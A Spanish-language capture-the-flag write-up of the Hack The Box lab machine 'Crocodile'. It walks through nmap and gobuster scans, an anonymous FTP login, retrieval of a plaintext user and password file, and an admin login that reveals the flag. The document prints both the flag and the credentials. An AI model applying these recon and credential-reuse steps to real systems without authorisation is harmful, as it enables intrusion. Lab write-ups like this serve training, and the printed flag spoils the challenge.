@@ -1,0 +1,170 @@
+## Iniciamos la vpn
+sudo openvpn starting_point_scr1pter98.ovpn
+##Conectados ya a la red de la máquina víctima..
+
+## WhichSystem
+
+[*] 10.129.1.15 (ttl -> 63): Linux
+
+## NMAP
+# Descubramos puertos y servicios en la máquina objetivo
+
+sudo nmap --open -sS -p- -sCV -n -Pn -T5 -v 10.129.1.15 -oG escaneoNmap
+
+#Descubrimos estos 2 puertos abiertos 
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.169
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Smash - Bootstrap Business Template
+Service Info: OS: Unix
+
+##Algo familiar...
+
+## Puerto 80 (HTTP)
+
+# Es posible que el puerto 80 esté corriendo un servidor web. Puedes intentar hacer una exploración más profunda de los servicios HTTP con herramientas como dirb,
+gobuster o dirbuster para encontrar directorios o archivos ocultos que puedan contener información útil, como una página de login o archivos de configuración.
+También puedes usar un navegador para acceder al sitio web y observar qué hay disponible.
+
+## Puerto 21 (FTP)
+
+# El puerto 21 sugiere que hay un servidor FTP en ejecución. Puedes intentar conectarte con el siguiente comando:
+
+ftp 10.129.1.15
+
+## Probemos lo más fácil > Ingresemos por FTP para chequear si se puede de manera anonima
+# Y.. así fue
+
+  pwn3r   ~  ftp 10.129.1.15
+Connected to 10.129.1.15.
+220 (vsFTPd 3.0.3)
+Name (10.129.1.15:pwn3r): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+## Veamos que archivos compartidos hay
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+
+#Ya encontramos algo interesante, nos traemos a local estos dos archivos y vemos de qué se trata
+
+  pwn3r   ~/Desktop/HTB/Crocodile/content  ls
+ allowed.userlist   allowed.userlist.passwd
+
+  pwn3r   ~/Desktop/HTB/Crocodile/content  cat allowed.userlist
+───────┬─────────────────────────────────────────────────────────────────
+       │ File: allowed.userlist
+───────┼─────────────────────────────────────────────────────────────────
+   1   │ aron
+   2   │ pwnmeow
+   3   │ egotisticalsw
+   4   │ admin
+───────┴─────────────────────────────────────────────────────────────────
+
+  pwn3r   ~/Desktop/HTB/Crocodile/content  cat allowed.userlist.passwd
+───────┬─────────────────────────────────────────────────────────────────
+       │ File: allowed.userlist.passwd
+───────┼─────────────────────────────────────────────────────────────────
+   1   │ aron > root
+   2   │ pwnmeow > Supersecretpassword1
+   3   │ egotisticalsw > @BaASD&9032123sADS
+   4   │ admin > rKXM59ESxesUFHAd
+───────┴────────────────────────
+
+#Al parecer tienen el mismo contenido, sigamos reconociendo el terreno.
+
+#Sigamos con el puerto 80; Aquí encontramos algunas cosas interesantes.
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Smash - Bootstrap Business Template
+
+##Probemos con gobuster a ver que directorios encontramos
+
+  pwn3r   ~  gobuster dir -u 10.129.1.15 -t200 -w /usr/share/dirb/wordlists/big.txt  -x php,html,js 2>/dev/null
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.1.15
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,js
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 276]
+/.htpasswd.php        (Status: 403) [Size: 276]
+/.htpasswd.html       (Status: 403) [Size: 276]
+/.htpasswd.js         (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htaccess.js         (Status: 403) [Size: 276]
+/.htaccess.php        (Status: 403) [Size: 276]
+/.htaccess.html       (Status: 403) [Size: 276]
+/assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
+/config.php           (Status: 200) [Size: 0]
+/css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
+/dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
+/fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
+/index.html           (Status: 200) [Size: 58565]
+/js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
+/login.php            (Status: 200) [Size: 1577]
+/server-status        (Status: 403) [Size: 276]
+
+===============================================================
+Finished
+===============================================================
+
+## Encontramos cositas interesantes, de momento solo nos devuelve 2 rutas con estado 200 o exitoso.
+
+/index.html >> En esta observamos que la página carga pero nada sucede 
+/login.php >> Un esperado panel de login
+
+En el panel de login deberíamos introducir las credenciales de admin y password rKXM59ESxesUFHAd // 
+Por alguna razon el archivo allowed.userlist.passwd no mostraba las contraseñas correctas
+
+Una vez nos autenticamos de manera correcta obtenemos nuestra flag. 
+
+FLAG: c7110277ac44d78b6a9fff2232434d16
+
+En resumen: En esta máquina vimos - FTP Anonymous Login
+								  - Web Site Structure Discovery
+								  - Apache
+								  - Protocols
+								  - Clear Text Credentials		
+								  
